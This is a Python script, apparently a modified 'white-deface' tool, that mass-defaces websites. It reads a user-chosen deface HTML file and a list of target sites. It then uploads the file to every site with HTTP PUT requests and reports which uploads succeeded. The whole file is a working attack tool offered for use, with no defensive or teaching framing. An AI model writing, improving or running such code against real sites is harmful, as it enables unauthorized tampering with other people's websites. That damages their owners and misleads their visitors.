# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import os.path
import threading

try:
    import requests
except ImportError:
    exit("install requests and try again ... (pip install requests)")

# Colors
red    = "\033[31m"
blue   = "\033[34m"
bold   = "\033[1m"
reset  = "\033[0m"
green  = "\033[32m"
yellow = "\033[33m"

colors = [
    "\033[38;5;226m",
    "\033[38;5;227m",
    "\033[38;5;229m",
    "\033[38;5;230m",
    "\033[38;5;190m",
    "\033[38;5;191m",
    "\033[38;5;220m",
    "\033[38;5;221m",
    "\033[38;5;142m",
    "\033[38;5;214m",
]
color1, color2, color3, color4, color5 = random.sample(colors, 5)

BANNER = f"{green}{bold}white-deface (modified){reset}"

def animate():
    text = "Uploading your script to websites..."
    while True:
        for i in range(len(text)):
            print(text[:i] + "_" + text[i+1:], end="\r", flush=True)
            time.sleep(0.1)

def eagle(tetew):
    ipt = ''
    if sys.version_info.major > 2:
        ipt = input(tetew)
    else:
        ipt = raw_input(tetew)
    return str(ipt)

def white(script, target_file="targets.txt"):
    # Read deface script with explicit encoding to avoid cp1252 errors
    with open(script, "r", encoding="utf-8", errors="replace") as f:
        op = f.read()

    # Read targets list
    with open(target_file, "r", encoding="utf-8", errors="replace") as target:
        target = target.readlines()

    s = requests.Session()

    print(" ")
    print(
        green + bold +
        "[✓]\033[0m \033[34mUploading your script to %d website(s)...."
        % (len(target)),
        end="",
        flush=True
    )
    print(" ")

    # start the animation thread
    t = threading.Thread(target=animate, daemon=True)
    t.start()

    for web in target:
        try:
            site = web.strip()
            if not site:  # skip empty lines
                continue

            # Add scheme if missing
            if not site.startswith(("http://", "https://")):
                site = "http://" + site

            # Ensure single trailing slash
            if not site.endswith("/"):
                site = site + "/"

            req = s.put(site, data=op, timeout=10)

            if not (200 <= req.status_code < 300):
                print(
                    f"{red}[{bold} FAILED TO UPLOAD !\033[0m     {red} ] {site}{script}"
                )
            else:
                print(
                    f"{green}[{bold} SUCCESSFULLY UPLOADED ✓\033[0m{green} ] {site}{script}"
                )

        except requests.exceptions.RequestException:
            # silently skip failures
            continue

        except KeyboardInterrupt:
            print()
            exit()

def main(__bn__):
    print(__bn__)
    while True:
        try:
            print(green + '[scammer.html]' + reset + blue)
            print(' ')
            a = eagle(
                green + "[+]\033[0m \033[34mEnter your deface script's name "
                "\033[33m[eg: defacescript.html]\033[0m \033[34m> "
            )

            if not os.path.isfile(a):
                print(' ')
                print(red + bold + "    file '%s' not found in this folder !" % (a,))
                print(" ")
                continue
            else:
                break

        except KeyboardInterrupt:
            print()
            exit()

    # Once we have a valid file, call white()
    white(a)

if __name__ == "__main__":
    # Only pull & clear when running directly, not on import
    os.system("git pull")
    os.system("cls")
    main(BANNER)